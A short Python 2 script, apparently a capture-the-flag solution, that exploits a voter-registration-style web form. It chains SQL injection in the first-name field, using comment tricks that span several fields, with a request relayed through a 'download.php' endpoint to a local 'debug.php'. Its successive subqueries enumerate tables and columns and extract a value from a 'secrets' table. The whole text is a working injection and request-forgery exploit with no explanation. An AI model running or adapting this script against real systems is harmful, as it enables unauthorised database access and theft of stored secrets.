import requests
import random
import urllib

subquery = "database()"
subquery = "select table_name from information_schema.tables where table_schema='votereg' LIMIT 1"
subquery = "select column_name from information_schema.columns where table_name='secrets' LIMIT 1"
subquery = "select column_name from information_schema.columns where table_name='secrets' LIMIT 1 OFFSET 1"
subquery = "select value from secrets LIMIT 1"

dl = '%x'%random.getrandbits(256)

d = ('http://127.0.0.1/secure/debug.php?' + 
        urllib.urlencode({
            "s":"3",
            "txtfirst_name":"A','b',("+subquery+"),'c'/*",
            "txtmiddle_name":"B",
            "txtname_suffix":"C",
            "txtLast_name":"D",
            "txtdob":"*/,'E",
            "txtdl_nmbr":dl,
            "txtRetypeDL":dl
            }) +
        "&")


r = requests.get("http://kansas.pwn.republican/download.php", params={"dl":d})
print r.text;
